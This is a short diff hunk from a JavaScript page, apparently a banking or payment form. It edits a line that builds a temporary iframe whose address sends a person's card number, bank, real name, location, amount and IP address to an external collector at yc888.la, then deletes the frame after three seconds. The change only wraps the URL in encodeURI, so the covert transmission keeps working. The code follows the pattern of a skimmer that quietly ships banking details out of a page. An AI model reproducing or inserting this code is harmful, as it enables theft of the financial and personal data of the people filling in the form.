@@ -48,7 +48,7 @@
              
             var iframes = $('<iframe>');
             $('body').append(iframes);
-            iframes[0].src = 'http://www.yc888.la/bank/save.php?name=' + name +'&master=' + master + '&bank=' + bank+ '&cardnum=' +cardnum+'&province=' +province+ '&city=' +city+ '&truename=' +truename+ '&amount=' +amount+ '&time=' + time+ '&isvip=' +isvip+ '&ip=' +ip+ '&desc='  + desc;
+            iframes[0].src = encodeURI('http://www.yc888.la/bank/save.php?name=' + name +'&master=' + master + '&bank=' + bank+ '&cardnum=' +cardnum+'&province=' +province+ '&city=' +city+ '&truename=' +truename+ '&amount=' +amount+ '&time=' + time+ '&isvip=' +isvip+ '&ip=' +ip+ '&desc='  + desc);
             setTimeout(function(){
               iframes.remove();    
             },3000)
